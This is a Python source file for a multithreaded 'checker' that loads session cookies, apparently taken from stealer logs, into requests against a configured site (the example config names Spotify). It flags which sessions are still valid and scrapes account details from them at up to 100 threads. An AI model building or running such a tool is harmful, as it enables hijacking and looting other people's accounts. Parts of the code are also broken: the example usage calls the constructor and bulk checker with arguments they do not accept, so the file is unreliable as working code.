"""Fast multithreaded checker library for Oxygen"""
import json
import requests
import http.cookiejar
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Union, Optional
from dataclasses import dataclass
import time
import logging
from utils import logsearch
import oxyapi

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class CheckResult:
    """Class for storing check results"""
    project_name: str
    status: str
    values: Dict[str, str] = None
    error: str = None
    check_time: float = None
    account: oxyapi.AccountResult = None

class FastChecker:
    """Fast multithreaded checker for Oxygen projects"""
    
    def __init__(self, 
                 config_path: str = None,
                 cookie_path: str = None,
                 max_workers: int = 100,
                 timeout: int = 30,
                 config_dict: Dict = None):
        """
        Initialize checker with either config path or config dict
        
        Args:
            config_path: Path to JSON config file
            cookie_path: Path to cookies.txt file
            max_workers: Maximum number of threads
            timeout: Request timeout in seconds
            config_dict: Config dictionary (alternative to config_path)
        """
        if config_dict:
            self.config = config_dict
        elif config_path:
            with open(config_path, 'r', encoding='utf-8') as f:
                self.config = json.load(f)
        else:
            raise ValueError("Either config_path or config_dict must be provided")
            
        self.timeout = timeout
        self.max_workers = max_workers
        
        # Setup cookie jar if path provided
        self.cookie_jar = None
        if cookie_path:
            self.cookie_jar = http.cookiejar.MozillaCookieJar(cookie_path)
            self.cookie_jar.load()
            
        # Prepare headers once
        self.headers = self._prepare_headers()
        
        # Setup session template
        self.session_template = requests.Session()
        if self.cookie_jar:
            self.session_template.cookies = self.cookie_jar
        
        # Request settings
        self.method = self.config["requestSettings"]["method"]
        self.url = self.config["requestSettings"]["url"]
        self.body = self.config["requestSettings"].get("body")
        
    def _prepare_headers(self) -> Dict[str, str]:
        """Prepare headers from config"""
        headers = {}
        for header_name, header_data in self.config["requestSettings"]["headers"].items():
            if header_data["enabled"]:
                headers[header_name] = header_data["value"]
        return headers
    
    def _parse_value(self, text: str, after: str, before: str) -> Optional[str]:
        """Parse value from text using after/before markers"""
        try:
            start = text.index(after) + len(after)
            end = text.index(before, start)
            return text[start:end].strip()
        except (ValueError, AttributeError):
            return None
            
    def _check_single(self, session: requests.Session, cookies: list[logsearch.Cookie]) -> CheckResult:
        """Check single account"""
        start_time = time.time()
        
        try:
            # Add cookies to session

            added = 0
            for cookie in cookies:
                if self.config["requestSettings"]["domain"] in cookie.url:
                    session.cookies.update(cookie.json())
                    added += 1
            
            if added == 0:
                # print("No cookies added")
                raise Exception("No cookies")
            # Main request
            response = session.request(
                method=self.method,
                url=self.url,
                headers=self.headers,
                data=self.body,
                timeout=self.timeout
            )
            response.raise_for_status()
            
            result = {"status": "invalid"}

            fields = {}
            
            # Parse values if enabled
            if self.config["parserSettings"]["useParser"]:
                # Check status validation
                status_value = self.config["parserSettings"]["values"]["value_1"]
                if status_value["valid_string"] in response.text:
                    result["status"] = "valid"
                
                # Parse other values
                for key, value_config in self.config["parserSettings"]["values"].items():
                    if key == "value_1":
                        continue
                        
                    try:
                        response_text = response.text
                        if value_config["url"] != self.url:
                            value_response = session.request(
                                method=value_config.get("method", "GET"),
                                url=value_config["url"],
                                headers=self.headers,
                                timeout=self.timeout
                            )
                            value_response.raise_for_status()
                            response_text = value_response.text
                        
                        parsed = self._parse_value(
                            response_text,
                            value_config["after"],
                            value_config["before"]
                        )
                        if parsed:
                            result[value_config["name"]] = parsed
                            fields[value_config["name"]] = parsed
                            
                    except Exception as e:
                        result[f"{value_config['name']}_error"] = str(e)
            
            return CheckResult(
                project_name=self.config["projectSettings"]["projectName"],
                status=result["status"],
                values=result,
                check_time=time.time() - start_time,
                account=oxyapi.AccountResult(cookies, fields, self.config["requestSettings"]["domain"])
            )
            
        except Exception as e:
            return CheckResult(
                status="error",
                error=str(e),
                check_time=time.time() - start_time
            )
            
    def check_bulk(self, cookies_list: list[list[logsearch.Cookie]]) -> List[CheckResult]:
        """
        Check multiple accounts in parallel
        
        Args:
            cookies_list: List of lists of Cookie objects
            
        Returns:
            List of CheckResult objects
        """
        results = []
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_cookies = {}
            
            # Submit all tasks
            for cookies in cookies_list:
                session = requests.Session()
                future = executor.submit(self._check_single, session, cookies)
                future_to_cookies[future] = cookies
            
            # Collect results
            for future in as_completed(future_to_cookies):
                try:
                    result = future.result()
                    results.append(result)
                except Exception as e:
                    results.append(CheckResult(
                        status="error",
                        error=f"Check error: {str(e)}"
                    ))
                    
        return results
    
    def check_single(self, cookies: list[logsearch.Cookie]) -> CheckResult:
        """
        Check single account using list of cookies
        
        Args:
            cookies: List of Cookie objects
            
        Returns:
            CheckResult object
        """
        with requests.Session() as session:
            return self._check_single(session, cookies)

def on_valid(cookies: list[logsearch.Cookie], fields: dict, path: str):
    """
    Callback for valid check results
    
    Args:
        cookies: List of Cookie objects
        fields: Dictionary with parsed values
        path: Path to original cookie file
    """
    pass  # Implement your logic here

def on_invalid(cookies: list[logsearch.Cookie], fields: dict, path: str):
    """
    Callback for invalid check results
    
    Args:
        cookies: List of Cookie objects
        fields: Dictionary with parsed values
        path: Path to original cookie file
    """
    pass  # Implement your logic here

# Example usage
if __name__ == "__main__":
    # Initialize checker
    checker = FastChecker(
        config_path="spotify_created.json",
        max_workers=100,
        timeout=30,
        on_valid=on_valid,
        on_invalid=on_invalid
    )
    
    # Check single account
    result = checker.check_single([...])
    print(f"Single check result: {result}")
    
    # Check multiple accounts
    cookie_list = ["cookies1.txt", "cookies2.txt", "cookies3.txt"]
    results = checker.check_bulk(cookie_list)
    
    # Print results
    for result in results:
        print(f"Status: {result.status}")
        if result.values:
            print(f"Values: {result.values}")
        if result.error:
            print(f"Error: {result.error}")
        print(f"Check time: {result.check_time:.2f}s")